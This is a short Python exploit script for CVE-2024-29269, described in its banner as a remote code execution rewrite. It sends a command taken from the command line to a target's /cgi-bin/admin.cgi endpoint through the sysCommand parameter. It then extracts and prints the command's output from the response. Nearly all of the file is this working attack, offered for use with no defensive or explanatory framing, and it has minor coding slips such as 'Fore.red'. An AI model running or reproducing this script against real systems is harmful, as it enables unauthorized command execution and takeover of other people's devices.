#!/bin/env python3

import requests
import re
import threading
from colorama import Fore, Style
import argparse
from concurrent.futures import ThreadPoolExecutor
import art


def color():

     text='''
          CVE-2024-29269
        Remote Code Execution
          Rewrite by Jhonson
         
        '''
     
     print(Fore.RED+ Style.BRIGHT +text+ Style.RESET_ALL)

color()

def simple_target(url,cmd,dir,partage):
   try:
       r=requests.get(str(url)+f'{dir}{cmd}', verify=False,timeout=20)
       if r.status_code==200:
           regex  = r'<CmdResult><!\[CDATA\[(.*?)\]\]></CmdResult>'
           matche = re.search(regex, r.text,re.DOTALL)
           print(f'[-]{url}\n\n'+Fore.GREEN + Style.BRIGHT +'[+] Vulnerable'+Style.RESET_ALL)
          
           result=matche.group(1)
           print(Fore.BLUE + Style.BRIGHT +f'[+]{result}'+Style.RESET_ALL)

       else:
           print('[-]'+url+Fore.red + Style.BRIGHT +'[-] No vulnerable '+matche.group(1))


   except requests.exceptions.MissingSchema:
          print('')
     

if __name__=='__main__':
     

      
       parser = argparse.ArgumentParser(description="CVE-2024-29269")
       parser.add_argument("-url", "--url", dest="url", help="url", required=False)
       parser.add_argument("-cmd", "--cmd", dest="cmd", help="command injection", required=False)          
       args = parser.parse_args()

       
       
       space='                                                    '
       target=args.url
      
       simple_target(target,args.cmd,f'/cgi-bin/admin.cgi?Command=sysCommand&Cmd=',space)
